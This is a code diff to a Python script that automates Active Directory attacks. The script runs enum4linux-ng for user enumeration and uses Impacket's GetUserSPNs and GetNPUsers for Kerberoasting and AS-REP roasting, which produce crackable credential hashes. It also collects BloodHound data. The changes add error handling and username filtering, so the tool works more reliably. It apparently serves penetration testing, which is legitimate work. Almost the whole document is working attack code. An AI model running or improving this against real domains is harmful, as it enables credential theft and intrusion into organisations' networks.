@@ -36,7 +36,13 @@ def kerberoast(domain, user, password, dc_ip, outdir):
     run_cmd(f"GetUserSPNs.py {domain}/{user}:{password} -dc-ip {dc_ip} -outputfile {outdir}/spns.hashes", f"{outdir}/kerberoast.log")
 
 def extract_users_enum4linux(dc_ip, userlist_path):
-    output = subprocess.check_output(f"enum4linux-ng {dc_ip}", shell=True).decode()
+    print(f"[*] Running enum4linux-ng against {dc_ip} to discover users...")
+    try:
+        output = subprocess.check_output(f"enum4linux-ng {dc_ip}", shell=True).decode()
+    except subprocess.CalledProcessError:
+        print("[-] enum4linux-ng failed.")
+        return []
+
     users = set()
     for line in output.splitlines():
         if "username:" in line.lower() or "[+]" in line.lower():
@@ -44,18 +50,35 @@ def extract_users_enum4linux(dc_ip, userlist_path):
             for part in parts:
                 if part.lower().startswith("svc-") or part.lower().startswith("admin") or part.isalnum():
                     users.add(part.lower())
-    with open(userlist_path, "w") as f:
-        for user in sorted(users):
-            f.write(user + "\n")
-    return userlist_path
+
+    users = sorted(users)
+    if users:
+        os.makedirs(os.path.dirname(userlist_path), exist_ok=True)
+        with open(userlist_path, "w") as f:
+            for user in users:
+                f.write(user + "\n")
+        print(f"[+] Found {len(users)} usernames. Saved to {userlist_path}")
+    else:
+        print("[-] No valid usernames found.")
+    
+    return users
 
 def asreproast(domain, userlist, dc_ip, outdir, auto_enum=False):
     if auto_enum:
-        print("[*] No userlist provided, running enum4linux-ng to extract usernames...")
+        print("[*] No userlist provided. Attempting to auto-enumerate usernames...")
         userlist = f"{outdir}/autogen_users.txt"
-        extract_users_enum4linux(dc_ip, userlist)
+        users = extract_users_enum4linux(dc_ip, userlist)
+        if not users:
+            print("[-] Skipping ASREPRoast. No usernames found.")
+            return
+    else:
+        if not os.path.isfile(userlist):
+            print(f"[-] Provided userlist {userlist} not found. Skipping ASREPRoast.")
+            return
+
     os.makedirs(outdir, exist_ok=True)
     run_cmd(f"GetNPUsers.py {domain}/ -usersfile {userlist} -format hashcat -dc-ip {dc_ip}", f"{outdir}/asrep.txt")
+    print(f"[+] ASREPRoast complete. Output saved to {outdir}/asrep.txt")
 
 def bloodhound(domain, user, password, dc_ip, outdir):
     run_cmd(f"bloodhound-python -u {user} -p {password} -d {domain} -dc {dc_ip} -c all -o {outdir}", f"{outdir}/bloodhound.log")
@@ -133,3 +156,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
